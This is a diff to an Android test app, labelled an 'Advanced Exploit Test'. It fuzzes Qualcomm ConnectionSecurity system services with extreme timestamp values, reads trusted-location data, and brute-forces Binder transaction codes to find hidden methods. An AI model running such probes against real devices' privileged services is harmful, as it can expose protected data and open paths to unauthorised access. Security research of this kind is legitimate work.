@@ -24,16 +24,14 @@ import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
 import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
 import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
 
-import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
+import java.lang.reflect.Method;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
-import java.util.ArrayList;
 import java.util.Date;
-import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
 
@@ -55,7 +53,7 @@ public class MainActivity extends AppCompatActivity {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
             mServiceManager = IServiceManager.Stub.asInterface(service);
-            appendLog("Service bound to ConnectionSecurityService");
+            appendLog("Service bound");
             updateStatus("Bound - starting tests");
             enableButtons(false, true);
             stopRequested.set(false);
@@ -146,36 +144,23 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeFullTest() {
         isTesting.set(true);
-        appendLog("========== ConnectionSecurityService Exploit Test ==========");
+        appendLog("========== ConnectionSecurity Advanced Exploit Test ==========");
 
-        // サービス名候補（コードから推測）
-        String[] serviceNames = {
-                "rtic",
-                "RticService",
-                "com.qualcomm.qti.qms.connectionsecuritysdk.RticService",
-                "tloc",
-                "TlocService",
-                "com.qualcomm.qti.qms.connectionsecuritysdk.TlocService",
-                "wifi",
-                "WifiAuditor",
-                "cellular",
-                "dns",
-                "certificate",
-                "arp",
-                "update"
-        };
+        // 既知のサービス取得（rtic, tloc）
+        IBinder rticBinder = getService("rtic");
+        IBinder tlocBinder = getService("tloc");
 
-        for (String name : serviceNames) {
-            if (stopRequested.get()) break;
-            testService(name);
+        if (rticBinder != null) {
+            IRticService rtic = IRticService.Stub.asInterface(rticBinder);
+            testRtic(rtic);
+            // さらに transact で未公開メソッドを探索
+            discoverMethods(rticBinder, "IRticService");
         }
 
-        // RticService と TlocService が特定できたら、詳細テスト
-        if (mRticBinder != null) {
-            testRtic();
-        }
-        if (mTlocBinder != null) {
-            testTloc();
+        if (tlocBinder != null) {
+            ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
+            testTloc(tloc);
+            discoverMethods(tlocBinder, "ITlocService");
         }
 
         appendLog("========== ALL TESTS COMPLETED ==========");
@@ -185,106 +170,119 @@ public class MainActivity extends AppCompatActivity {
         saveLog();
     }
 
-    private IBinder mRticBinder = null;
-    private IBinder mTlocBinder = null;
-
-    private void testService(String serviceName) {
-        if (mServiceManager == null) return;
-        appendLog("Trying to get service: " + serviceName);
+    private IBinder getService(String serviceName) {
+        if (mServiceManager == null) return null;
         try {
             int[] status = new int[1];
             IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
             if (binder != null) {
-                appendLog("  SUCCESS: Got binder for " + serviceName + ", status=" + status[0]);
-                try {
-                    String descriptor = binder.getInterfaceDescriptor();
-                    appendLog("  Interface descriptor: " + descriptor);
-                    if (descriptor.contains("IRticService")) {
-                        mRticBinder = binder;
-                    } else if (descriptor.contains("ITlocService")) {
-                        mTlocBinder = binder;
-                    }
-                } catch (Exception e) {
-                    appendLog("  Could not get descriptor: " + e.getMessage());
-                }
+                appendLog("Got binder for " + serviceName + ", status=" + status[0]);
+                return binder;
             } else {
-                appendLog("  FAIL: getService returned null, status=" + status[0]);
+                appendLog("Failed to get " + serviceName + ", status=" + status[0]);
+                return null;
             }
         } catch (RemoteException e) {
-            appendLog("  RemoteException: " + e.getMessage());
+            appendLog("RemoteException for " + serviceName + ": " + e.getMessage());
+            return null;
         }
     }
 
-    private void testRtic() {
-        appendLog("--- Testing IRticService ---");
-        IRticService rtic = IRticService.Stub.asInterface(mRticBinder);
-        if (rtic == null) {
-            appendLog("  Failed to cast to IRticService");
-            return;
-        }
-        try {
-            // 正常な呼び出し
-            int[] status = new int[1];
-            int[] ret = new int[1];
-            long now = System.currentTimeMillis();
-            appendLog("  Calling getRticData with timestamp=" + now);
-            byte[] data = rtic.getRticData(now, status, ret, false);
-            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
-            if (data != null && data.length > 0) {
-                String hex = bytesToHex(data, 64);
-                appendLog("  First 64 bytes: " + hex);
+    private void testRtic(IRticService rtic) {
+        appendLog("--- Testing IRticService with fuzzing ---");
+        long[] timestamps = {
+            0,
+            -1,
+            Long.MIN_VALUE,
+            Long.MAX_VALUE,
+            123456789L,
+            System.currentTimeMillis(),
+            0xFFFFFFFFL,
+            0x100000000L,
+            0x7FFFFFFFFFFFFFFFL,
+            0x8000000000000000L
+        };
+        boolean[] bools = {false, true};
+        for (long ts : timestamps) {
+            if (stopRequested.get()) break;
+            for (boolean z : bools) {
+                try {
+                    int[] status = new int[1];
+                    int[] ret = new int[1];
+                    byte[] data = rtic.getRticData(ts, status, ret, z);
+                    appendLog("TS=" + ts + ", z=" + z + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
+                    if (data != null && data.length > 0) {
+                        String hex = bytesToHex(data, 100);
+                        appendLog("  Data(hex): " + hex);
+                        try {
+                            String str = new String(data, StandardCharsets.UTF_8);
+                            appendLog("  Data(UTF-8): " + str);
+                        } catch (Exception e) {}
+                    }
+                } catch (RemoteException e) {
+                    appendLog("RemoteException: " + e.getMessage());
+                } catch (Exception e) {
+                    appendLog("Exception: " + e.toString());
+                }
             }
-
-            // 異常値: 負のタイムスタンプ
-            appendLog("  Calling getRticData with timestamp=-1");
-            data = rtic.getRticData(-1, status, ret, false);
-            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
-
-            // 巨大なタイムスタンプ
-            appendLog("  Calling getRticData with timestamp=Long.MAX_VALUE");
-            data = rtic.getRticData(Long.MAX_VALUE, status, ret, false);
-            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
-
-            // フォーマット指定 (z=true)
-            appendLog("  Calling getRticData with z=true");
-            data = rtic.getRticData(now, status, ret, true);
-            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
-            if (data != null && data.length > 0) {
-                String str = new String(data, StandardCharsets.ISO_8859_1);
-                appendLog("  Data as string: " + str.substring(0, Math.min(200, str.length())));
-            }
-        } catch (RemoteException e) {
-            appendLog("  RemoteException: " + e.getMessage());
-        } catch (Exception e) {
-            appendLog("  Exception: " + e.toString());
         }
+        // 巨大なバイト配列を引数で渡せないので、代わりに null を渡すテスト
+        // 本来は getRticData に byte[] を渡すオーバーロードはないが、リフレクションで可能か?
     }
 
-    private void testTloc() {
+    private void testTloc(ITlocService tloc) {
         appendLog("--- Testing ITlocService ---");
-        ITlocService tloc = ITlocService.Stub.asInterface(mTlocBinder);
-        if (tloc == null) {
-            appendLog("  Failed to cast to ITlocService");
-            return;
-        }
         try {
             int[] status = new int[1];
             int[] ret = new int[1];
-            appendLog("  Calling getTrustedLocation");
             byte[] data = tloc.getTrustedLocation(status, ret);
-            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
+            appendLog("getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
             if (data != null && data.length > 0) {
                 String str = new String(data, StandardCharsets.UTF_8);
-                appendLog("  Data: " + str);
+                appendLog("Data: " + str);
             }
-
-            appendLog("  Calling tlocWarmUp");
             int warmup = tloc.tlocWarmUp();
-            appendLog("  tlocWarmUp returned: " + warmup);
+            appendLog("tlocWarmUp returned: " + warmup);
         } catch (RemoteException e) {
-            appendLog("  RemoteException: " + e.getMessage());
-        } catch (Exception e) {
-            appendLog("  Exception: " + e.toString());
+            appendLog("RemoteException: " + e.getMessage());
+        }
+    }
+
+    private void discoverMethods(IBinder binder, String serviceName) {
+        appendLog("--- Discovering hidden methods for " + serviceName + " via transact ---");
+        for (int code = 1; code <= 30; code++) {
+            if (stopRequested.get()) break;
+            Parcel data = Parcel.obtain();
+            Parcel reply = Parcel.obtain();
+            try {
+                // 簡易的なデータを入れてみる
+                data.writeInterfaceToken(binder.getInterfaceDescriptor());
+                boolean success = binder.transact(code, data, reply, 0);
+                if (success) {
+                    appendLog("Method code " + code + " succeeded, reply size=" + reply.dataSize());
+                    // 読み取りを試みる
+                    reply.setDataPosition(0);
+                    try {
+                        int result = reply.readInt();
+                        appendLog("  readInt: " + result);
+                    } catch (Exception e) {}
+                    try {
+                        String s = reply.readString();
+                        appendLog("  readString: " + s);
+                    } catch (Exception e) {}
+                    try {
+                        byte[] b = reply.createByteArray();
+                        appendLog("  byte[] length: " + (b != null ? b.length : 0));
+                    } catch (Exception e) {}
+                } else {
+                    appendLog("Method code " + code + " failed (security exception)");
+                }
+            } catch (Exception e) {
+                appendLog("Method code " + code + " threw: " + e.getClass().getSimpleName());
+            } finally {
+                data.recycle();
+                reply.recycle();
+            }
         }
     }
 
